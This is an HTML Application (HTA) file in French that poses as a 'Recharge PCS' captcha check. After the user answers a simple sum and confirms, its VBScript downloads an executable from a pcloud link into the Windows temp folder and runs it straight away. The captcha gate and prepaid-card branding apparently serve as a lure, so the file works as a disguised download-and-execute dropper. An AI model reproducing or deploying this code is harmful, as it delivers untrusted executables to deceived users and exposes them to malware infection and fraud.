<html>
<head>
<HTA:APPLICATION 
  ID="CaptchaHTA"
  APPLICATIONNAME="Recharge PCS"
  BORDER="dialog"
  CAPTION="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
/>
<title>Vérification Recharge PCS</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    padding: 40px;
    text-align: center;
  }
  h2 {
    color: #e74c3c;
  }
  input {
    font-size: 16px;
    padding: 8px;
    width: 120px;
    margin: 15px;
    text-align: center;
  }
  button {
    font-size: 16px;
    padding: 10px 20px;
    cursor: pointer;
  }
  .status {
    margin-top: 20px;
    font-size: 14px;
    color: #2980b9;
  }
</style>

<script language="VBScript">
Dim a, b, answer

Sub Window_OnLoad
  Randomize
  a = Int(Rnd * 10) + 1
  b = Int(Rnd * 10) + 1
  answer = a + b
  document.getElementById("question").innerText = "Combien font " & a & " + " & b & " ?"
End Sub

Sub verifier
  Dim response
  If CInt(document.getElementById("captcha").value) = answer Then
    response = MsgBox("✅ Captcha réussi. Voulez-vous lancer le téléchargement de Recharge-Pcs.exe ?", vbYesNo + vbQuestion, "Confirmation")
    If response = vbYes Then
      telechargerEtLancer
    End If
  Else
    MsgBox "❌ Réponse incorrecte. Réessayez.", vbExclamation, "Erreur de captcha"
  End If
End Sub

Sub telechargerEtLancer
  On Error Resume Next

  Dim shell, fso, temp, exePath, http, stream, url
  Set shell = CreateObject("WScript.Shell")
  Set fso = CreateObject("Scripting.FileSystemObject")
  temp = shell.ExpandEnvironmentStrings("%TEMP%")
  exePath = temp & "\Recharge-Pcs.exe"

  url = "https://e.pcloud.link/publink/show?code=XZHos6ZxzW6QFB2NoHjEsQeRaI8oyectU8V"

  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>Téléchargement en cours...</div>"

  Set http = CreateObject("Microsoft.XMLHTTP")
  http.Open "GET", url, False
  http.Send

  If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile exePath, 2
    stream.Close

    document.getElementById("status").innerText = "✅ Téléchargement terminé. Lancement en cours..."
    shell.Run Chr(34) & exePath & Chr(34), 1, False
  Else
    MsgBox "Erreur pendant le téléchargement.", vbCritical, "Erreur"
  End If
End Sub
</script>
</head>
<body>
  <h2 id="question">Chargement captcha...</h2>
  <input type="text" id="captcha" placeholder="Votre réponse" />
  <br />
  <button onclick="verifier">Valider</button>
</body>
</html>
